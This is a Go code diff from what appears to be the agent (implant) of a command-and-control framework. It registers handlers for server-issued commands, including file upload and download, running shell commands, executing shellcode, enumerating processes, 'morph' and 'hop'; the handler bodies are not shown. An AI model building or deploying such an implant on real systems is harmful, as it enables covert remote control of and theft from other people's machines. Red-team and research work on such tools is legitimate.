@@ -7,8 +7,14 @@ import (
 	"math/rand"
 	"numinon_shadow/internal/agent/comm"
 	"numinon_shadow/internal/agent/config"
+	"numinon_shadow/internal/models"
 	"time"
 )
+
+// CommandHandlerFunc defines the signature for functions that handle specific C2 commands.
+// It takes the raw task response from the server and a pointer to the agent instance.
+// It's responsible for parsing its specific arguments from task.Data and returning a AgentTaskResult.
+type CommandHandlerFunc func(agent *Agent, task models.ServerTaskResponse) models.AgentTaskResult
 
 // Agent represents an agent instance
 type Agent struct {
@@ -16,6 +22,20 @@ type Agent struct {
 	communicator comm.Communicator
 	stopChan     chan struct{}
 	rng          *rand.Rand
+
+	commandHandlers map[string]CommandHandlerFunc // Maps commands to their keywords
+}
+
+func registerCommands(agent *Agent) *Agent {
+	agent.commandHandlers["upload_file"] = (*Agent).handleUploadFileTask
+	agent.commandHandlers["download_file"] = (*Agent).handleDownloadFileTask
+	agent.commandHandlers["run_cmd"] = (*Agent).handleRunCommandTask
+	agent.commandHandlers["execute_shellcode"] = (*Agent).handleExecuteShellcodeTask
+	agent.commandHandlers["enumerate_processes"] = (*Agent).handleEnumerateProcessesTask
+	agent.commandHandlers["morph"] = (*Agent).handleMorphTask
+	agent.commandHandlers["hop"] = (*Agent).handleHopTask
+
+	return agent
 }
 
 // NewAgent creates and initializes a new Agent instance.
@@ -36,6 +56,8 @@ func NewAgent(cfg config.AgentConfig) (*Agent, error) {
 		stopChan:     make(chan struct{}),
 		rng:          rand.New(rand.NewSource(time.Now().UnixNano())),
 	}
+
+	agent = registerCommands(agent) // REGISTER ALL OUR COMMANDS
 
 	log.Println("|AGENT INIT|-> Agent instance created successfully.")
 	return agent, nil
